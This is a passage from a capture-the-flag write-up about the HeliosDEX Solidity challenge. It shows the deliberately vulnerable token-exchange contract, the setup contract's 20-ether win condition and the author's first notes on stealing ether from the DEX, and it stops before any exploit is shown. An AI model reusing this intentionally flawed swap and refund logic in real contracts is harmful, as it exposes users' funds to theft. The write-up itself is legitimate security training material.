+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">113
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">114
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">115
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">116
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">117
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">118
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">119
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">120
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">121
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">122
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">123
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">124
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">125
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">126
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">127
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">128
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">129
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">130
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">131
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">132
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">133
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">134
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">135
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">136
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">137
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">138
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">139
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">140
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">141
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">142
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">143
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">144
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">145
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">146
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">147
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">148
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">149
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">150
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">151
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">152
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">153
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">154
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#859289;font-style:italic">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">pragma solidity</span> <span style="color:#7a8478">^</span><span style="color:#d699b6">0</span>.<span style="color:#d699b6">8</span>.<span style="color:#d699b6">28</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">/***
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">    __  __     ___            ____  _______  __
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">   / / / /__  / (_)___  _____/ __ \/ ____/ |/ /
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">  / /_/ / _ \/ / / __ \/ ___/ / / / __/  |   / 
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"> / __  /  __/ / / /_/ (__  ) /_/ / /___ /   |  
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">/_/ /_/\___/_/_/\____/____/_____/_____//_/|_|  
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">                                               
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">    Today&#39;s item listing:
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">    * Eldorion Fang (ELD): A shard of a Eldorion&#39;s fang, said to imbue the holder with courage and the strength of the ancient beast. A symbol of valor in battle.
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">    * Malakar Essence (MAL): A dark, viscous substance, pulsing with the corrupted power of Malakar. Use with extreme caution, as it whispers promises of forbidden strength. MAY CAUSE HALLUCINATIONS.
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">    * Helios Lumina Shards (HLS): Fragments of pure, solidified light, radiating the warmth and energy of Helios. These shards are key to powering Eldoria&#39;s invisible eye.
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">***/</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">import</span> <span style="color:#b2c98f">&#34;@openzeppelin/contracts/token/ERC20/ERC20.sol&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">import</span> <span style="color:#b2c98f">&#34;@openzeppelin/contracts/utils/math/Math.sol&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">contract</span> EldorionFang <span style="color:#e67e80">is</span> ERC20 {
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">constructor</span>(<span style="color:#dbbc7f">uint256</span> initialSupply) ERC20(<span style="color:#b2c98f">&#34;EldorionFang&#34;</span>, <span style="color:#b2c98f">&#34;ELD&#34;</span>) {
+</span></span><span style="display:flex;"><span>        _mint(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, initialSupply);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">contract</span> MalakarEssence <span style="color:#e67e80">is</span> ERC20 {
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">constructor</span>(<span style="color:#dbbc7f">uint256</span> initialSupply) ERC20(<span style="color:#b2c98f">&#34;MalakarEssence&#34;</span>, <span style="color:#b2c98f">&#34;MAL&#34;</span>) {
+</span></span><span style="display:flex;"><span>        _mint(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, initialSupply);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">contract</span> HeliosLuminaShards <span style="color:#e67e80">is</span> ERC20 {
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">constructor</span>(<span style="color:#dbbc7f">uint256</span> initialSupply) ERC20(<span style="color:#b2c98f">&#34;HeliosLuminaShards&#34;</span>, <span style="color:#b2c98f">&#34;HLS&#34;</span>) {
+</span></span><span style="display:flex;"><span>        _mint(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, initialSupply);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">contract</span> HeliosDEX {
+</span></span><span style="display:flex;"><span>    EldorionFang <span style="color:#e67e80">public</span> eldorionFang;
+</span></span><span style="display:flex;"><span>    MalakarEssence <span style="color:#e67e80">public</span> malakarEssence;
+</span></span><span style="display:flex;"><span>    HeliosLuminaShards <span style="color:#e67e80">public</span> heliosLuminaShards;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> <span style="color:#e67e80">public</span> reserveELD;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> <span style="color:#e67e80">public</span> reserveMAL;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> <span style="color:#e67e80">public</span> reserveHLS;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> <span style="color:#e67e80">public</span> <span style="color:#e67e80">immutable</span> exchangeRatioELD <span style="color:#7a8478">=</span> <span style="color:#d699b6">2</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> <span style="color:#e67e80">public</span> <span style="color:#e67e80">immutable</span> exchangeRatioMAL <span style="color:#7a8478">=</span> <span style="color:#d699b6">4</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> <span style="color:#e67e80">public</span> <span style="color:#e67e80">immutable</span> exchangeRatioHLS <span style="color:#7a8478">=</span> <span style="color:#d699b6">10</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> <span style="color:#e67e80">public</span> <span style="color:#e67e80">immutable</span> feeBps <span style="color:#7a8478">=</span> <span style="color:#d699b6">25</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">mapping</span>(<span style="color:#dbbc7f">address</span> <span style="color:#7a8478">=&gt;</span> <span style="color:#dbbc7f">bool</span>) <span style="color:#e67e80">public</span> hasRefunded;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">bool</span> <span style="color:#e67e80">public</span> _tradeLock <span style="color:#7a8478">=</span> <span style="color:#e67e80">false</span>;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">event</span> HeliosBarter(<span style="color:#dbbc7f">address</span> item, <span style="color:#dbbc7f">uint256</span> inAmount, <span style="color:#dbbc7f">uint256</span> outAmount);
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">event</span> HeliosRefund(<span style="color:#dbbc7f">address</span> item, <span style="color:#dbbc7f">uint256</span> inAmount, <span style="color:#dbbc7f">uint256</span> ethOut);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">constructor</span>(<span style="color:#dbbc7f">uint256</span> initialSupplies) <span style="color:#e67e80">payable</span> {
+</span></span><span style="display:flex;"><span>        eldorionFang <span style="color:#7a8478">=</span> <span style="color:#e67e80">new</span> EldorionFang(initialSupplies);
+</span></span><span style="display:flex;"><span>        malakarEssence <span style="color:#7a8478">=</span> <span style="color:#e67e80">new</span> MalakarEssence(initialSupplies);
+</span></span><span style="display:flex;"><span>        heliosLuminaShards <span style="color:#7a8478">=</span> <span style="color:#e67e80">new</span> HeliosLuminaShards(initialSupplies);
+</span></span><span style="display:flex;"><span>        reserveELD <span style="color:#7a8478">=</span> initialSupplies;
+</span></span><span style="display:flex;"><span>        reserveMAL <span style="color:#7a8478">=</span> initialSupplies;
+</span></span><span style="display:flex;"><span>        reserveHLS <span style="color:#7a8478">=</span> initialSupplies;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">modifier</span> <span style="color:#b2c98f">underHeliosEye</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span> <span style="color:#7a8478">&gt;</span> <span style="color:#d699b6">0</span>, <span style="color:#b2c98f">&#34;HeliosDEX: Helios sees your empty hand! Only true offerings are worthy of a HeliosBarter&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">_</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">modifier</span> <span style="color:#b2c98f">heliosGuardedTrade</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(_tradeLock <span style="color:#7a8478">!=</span> <span style="color:#e67e80">true</span>, <span style="color:#b2c98f">&#34;HeliosDEX: Helios shields this trade! Another transaction is already underway. Patience, traveler&#34;</span>);
+</span></span><span style="display:flex;"><span>        _tradeLock <span style="color:#7a8478">=</span> <span style="color:#e67e80">true</span>;  
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">_</span>;
+</span></span><span style="display:flex;"><span>        _tradeLock <span style="color:#7a8478">=</span> <span style="color:#e67e80">false</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">swapForELD</span>() <span style="color:#e67e80">external</span> <span style="color:#e67e80">payable</span> underHeliosEye {
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint256</span> grossELD <span style="color:#7a8478">=</span> Math.mulDiv(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span>, exchangeRatioELD, <span style="color:#d699b6">1</span>e18, Math.Rounding(<span style="color:#d699b6">0</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint256</span> fee <span style="color:#7a8478">=</span> (grossELD <span style="color:#7a8478">*</span> feeBps) <span style="color:#7a8478">/</span> <span style="color:#d699b6">10</span>_000;
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint256</span> netELD <span style="color:#7a8478">=</span> grossELD <span style="color:#7a8478">-</span> fee;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(netELD <span style="color:#7a8478">&lt;=</span> reserveELD, <span style="color:#b2c98f">&#34;HeliosDEX: Helios grieves that the ELD reserves are not plentiful enough for this exchange. A smaller offering would be most welcome&#34;</span>);
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>        reserveELD <span style="color:#7a8478">-=</span> netELD;
+</span></span><span style="display:flex;"><span>        eldorionFang.<span style="color:#d699b6">transfer</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, netELD);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        emit HeliosBarter(<span style="color:#dbbc7f">address</span>(eldorionFang), <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span>, netELD);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">swapForMAL</span>() <span style="color:#e67e80">external</span> <span style="color:#e67e80">payable</span> underHeliosEye {
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint256</span> grossMal <span style="color:#7a8478">=</span> Math.mulDiv(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span>, exchangeRatioMAL, <span style="color:#d699b6">1</span>e18, Math.Rounding(<span style="color:#d699b6">1</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint256</span> fee <span style="color:#7a8478">=</span> (grossMal <span style="color:#7a8478">*</span> feeBps) <span style="color:#7a8478">/</span> <span style="color:#d699b6">10</span>_000;
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint256</span> netMal <span style="color:#7a8478">=</span> grossMal <span style="color:#7a8478">-</span> fee;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(netMal <span style="color:#7a8478">&lt;=</span> reserveMAL, <span style="color:#b2c98f">&#34;HeliosDEX: Helios grieves that the MAL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        reserveMAL <span style="color:#7a8478">-=</span> netMal;
+</span></span><span style="display:flex;"><span>        malakarEssence.<span style="color:#d699b6">transfer</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, netMal);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        emit HeliosBarter(<span style="color:#dbbc7f">address</span>(malakarEssence), <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span>, netMal);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">swapForHLS</span>() <span style="color:#e67e80">external</span> <span style="color:#e67e80">payable</span> underHeliosEye {
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint256</span> grossHLS <span style="color:#7a8478">=</span> Math.mulDiv(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span>, exchangeRatioHLS, <span style="color:#d699b6">1</span>e18, Math.Rounding(<span style="color:#d699b6">3</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint256</span> fee <span style="color:#7a8478">=</span> (grossHLS <span style="color:#7a8478">*</span> feeBps) <span style="color:#7a8478">/</span> <span style="color:#d699b6">10</span>_000;
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint256</span> netHLS <span style="color:#7a8478">=</span> grossHLS <span style="color:#7a8478">-</span> fee;
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(netHLS <span style="color:#7a8478">&lt;=</span> reserveHLS, <span style="color:#b2c98f">&#34;HeliosDEX: Helios grieves that the HSL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome&#34;</span>);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        reserveHLS <span style="color:#7a8478">-=</span> netHLS;
+</span></span><span style="display:flex;"><span>        heliosLuminaShards.<span style="color:#d699b6">transfer</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, netHLS);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        emit HeliosBarter(<span style="color:#dbbc7f">address</span>(heliosLuminaShards), <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span>, netHLS);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">oneTimeRefund</span>(<span style="color:#dbbc7f">address</span> item, <span style="color:#dbbc7f">uint256</span> amount) <span style="color:#e67e80">external</span> heliosGuardedTrade {
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(<span style="color:#7a8478">!</span>hasRefunded[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>], <span style="color:#b2c98f">&#34;HeliosDEX: refund already bestowed upon thee&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(amount <span style="color:#7a8478">&gt;</span> <span style="color:#d699b6">0</span>, <span style="color:#b2c98f">&#34;HeliosDEX: naught for naught is no trade. Offer substance, or be gone!&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint256</span> exchangeRatio;
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">if</span> (item <span style="color:#7a8478">==</span> <span style="color:#dbbc7f">address</span>(eldorionFang)) {
+</span></span><span style="display:flex;"><span>            exchangeRatio <span style="color:#7a8478">=</span> exchangeRatioELD;
+</span></span><span style="display:flex;"><span>            <span style="color:#d699b6">require</span>(eldorionFang.transferFrom(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, <span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">this</span>), amount), <span style="color:#b2c98f">&#34;ELD transfer failed&#34;</span>);
+</span></span><span style="display:flex;"><span>            reserveELD <span style="color:#7a8478">+=</span> amount;
+</span></span><span style="display:flex;"><span>        } <span style="color:#e67e80">else</span> <span style="color:#e67e80">if</span> (item <span style="color:#7a8478">==</span> <span style="color:#dbbc7f">address</span>(malakarEssence)) {
+</span></span><span style="display:flex;"><span>            exchangeRatio <span style="color:#7a8478">=</span> exchangeRatioMAL;
+</span></span><span style="display:flex;"><span>            <span style="color:#d699b6">require</span>(malakarEssence.transferFrom(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, <span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">this</span>), amount), <span style="color:#b2c98f">&#34;MAL transfer failed&#34;</span>);
+</span></span><span style="display:flex;"><span>            reserveMAL <span style="color:#7a8478">+=</span> amount;
+</span></span><span style="display:flex;"><span>        } <span style="color:#e67e80">else</span> <span style="color:#e67e80">if</span> (item <span style="color:#7a8478">==</span> <span style="color:#dbbc7f">address</span>(heliosLuminaShards)) {
+</span></span><span style="display:flex;"><span>            exchangeRatio <span style="color:#7a8478">=</span> exchangeRatioHLS;
+</span></span><span style="display:flex;"><span>            <span style="color:#d699b6">require</span>(heliosLuminaShards.transferFrom(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, <span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">this</span>), amount), <span style="color:#b2c98f">&#34;HLS transfer failed&#34;</span>);
+</span></span><span style="display:flex;"><span>            reserveHLS <span style="color:#7a8478">+=</span> amount;
+</span></span><span style="display:flex;"><span>        } <span style="color:#e67e80">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#d699b6">revert</span>(<span style="color:#b2c98f">&#34;HeliosDEX: Helios descries forbidden offering&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint256</span> grossEth <span style="color:#7a8478">=</span> Math.mulDiv(amount, <span style="color:#d699b6">1</span>e18, exchangeRatio);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint256</span> fee <span style="color:#7a8478">=</span> (grossEth <span style="color:#7a8478">*</span> feeBps) <span style="color:#7a8478">/</span> <span style="color:#d699b6">10</span>_000;
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint256</span> netEth <span style="color:#7a8478">=</span> grossEth <span style="color:#7a8478">-</span> fee;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        hasRefunded[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>] <span style="color:#7a8478">=</span> <span style="color:#e67e80">true</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">payable</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>).<span style="color:#d699b6">transfer</span>(netEth);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        emit HeliosRefund(item, amount, netEth);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</details>
+
+<h2 id="reading-the-code">Reading the code</h2>
+<h3 id="setupsol">Setup.sol</h3>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">constructor</span>(<span style="color:#dbbc7f">address</span> _player) <span style="color:#e67e80">payable</span> {
+</span></span><span style="display:flex;"><span>    TARGET <span style="color:#7a8478">=</span> <span style="color:#e67e80">new</span> HeliosDEX{<span style="color:#d699b6">value</span><span style="color:#7a8478">:</span> <span style="color:#d699b6">1000</span> <span style="color:#e67e80">ether</span>}(<span style="color:#d699b6">1000</span>);
+</span></span><span style="display:flex;"><span>    player <span style="color:#7a8478">=</span> _player;
+</span></span><span style="display:flex;"><span>    emit DeployedTarget(<span style="color:#dbbc7f">address</span>(TARGET));
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>First, the setup contract is deployed and it deploys itself an <code>HeliosDEX</code> contract and transfers it 1000 ethers and <code>1000</code> in argument.</p>
+<p>Also, the solve function only check if the player (us), have at least 20 ethers.
+So we can guess we have to steal ethers.</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">isSolved</span>() <span style="color:#e67e80">public</span> <span style="color:#e67e80">view</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">bool</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">return</span> player.<span style="color:#d699b6">balance</span> <span style="color:#7a8478">&gt;=</span> <span style="color:#d699b6">20</span> <span style="color:#e67e80">ether</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s look at the HeliosDEX contracts.</p>
